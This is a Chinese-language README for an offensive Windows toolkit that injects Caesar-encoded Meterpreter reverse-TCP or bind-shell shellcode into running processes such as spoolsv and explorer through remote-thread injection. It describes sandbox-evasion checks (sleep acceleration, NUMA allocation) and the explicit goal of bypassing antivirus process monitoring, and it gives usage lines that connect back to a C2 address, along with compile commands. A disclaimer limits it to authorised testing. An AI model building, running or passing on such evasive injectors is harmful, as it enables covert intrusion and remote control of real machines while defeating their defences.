**免责声明**：本工具仅供安全研究和授权测试使用，使用者须遵守当地法律法规并获得合法授权。对于任何未经授权的非法使用，开发者不承担任何责任。

#### 技术原理

- **远程线程注入**：通过 `OpenProcess` 打开目标进程，利用 `VirtualAllocEx` 在目标进程空间申请内存，`WriteProcessMemory` 写入解码后的 shellcode，最后 `CreateRemoteThread` 创建远程线程执行。
- **载荷加密与动态配置**：shellcode 使用**凯撒密码（+5）**  加密存储在程序中，运行时解密。IP 和端口通过搜索 `sockaddr` 结构占位符（`AF_INET 0x02, 0x00` + 端口 `0x22, 0x22`）实现动态替换，避免硬编码。
- **反沙箱/反分析**：

  - **睡眠加速检测**：执行 `Sleep(5000)`，若真实睡眠时间小于 4.5 秒则判定为沙箱。
  - **NUMA 内存分配检测**：调用 `VirtualAllocExNuma`，若失败则可能处于不支持 NUMA 的沙箱环境，随即退出。
- **架构适配**：x64 和 x86 版本使用对应架构的载荷，IP 偏移量不同（x64: `pos+4`，x86: `pos-5`），需编译为匹配的平台。

#### 使用场景

- 需要将 payload 注入到已存在的系统进程（如 `spoolsv`、`explorer`）中，以逃避进程监控或利用高权限进程上下文。
- 适用于已获得管理员权限但需绕过杀软进程创建监控的场景。

### 包含程序

| 程序 | 架构 | 载荷类型                |
| ------ | ------ | ------------------------- |
| `Met64Inject.exe`     | x64  | Meterpreter reverse TCP |
| `MetInject.exe`     | x86  | Meterpreter reverse TCP |
| `Shell64Inject.exe`     | x64  | 正向 Shell (cmd)        |
| `ShellInject.exe`     | x86  | 正向 Shell (cmd)        |

### 用法

```cmd
<程序名>.exe <IP> <Port> <目标进程名>
```

示例：

```cmd
Met64Inject.exe 10.10.14.10 4444 spoolsv
ShellInject.exe 10.10.14.10 4444 explorer
```

- **IP/Port**：C2 监听地址和端口。
- **目标进程名**：正在运行的进程名称（不含路径，如 `notepad`、`spoolsv`）。
- 建议选择未受 PPL 保护的 SYSTEM 进程（如 `spoolsv`）以提高稳定性。

### 编译

使用 Visual Studio 开发者命令提示符或 `csc`：

```cmd
# x64
csc /platform:x64 /out:Met64Inject.exe Met64Inject.cs
csc /platform:x64 /out:Shell64Inject.exe Shell64Inject.cs

# x86
csc /platform:x86 /out:MetInject.exe MetInject.cs
csc /platform:x86 /out:ShellInject.exe ShellInject.cs
```

务必确保编译出的程序架构与目标进程架构一致。

### 注意事项

- 需要**管理员权限**，否则可能无法打开进程句柄。
- 内置反沙箱机制（睡眠检测 + NUMA 内存分配），启动后会有约 5 秒延迟。
- 载荷采用凯撒+5 加密存储，运行时动态解密并替换 IP/Port。
- 如果目标机器启用了 WDAG/ACG，建议改用 Hollow 工具或调整注入方式。
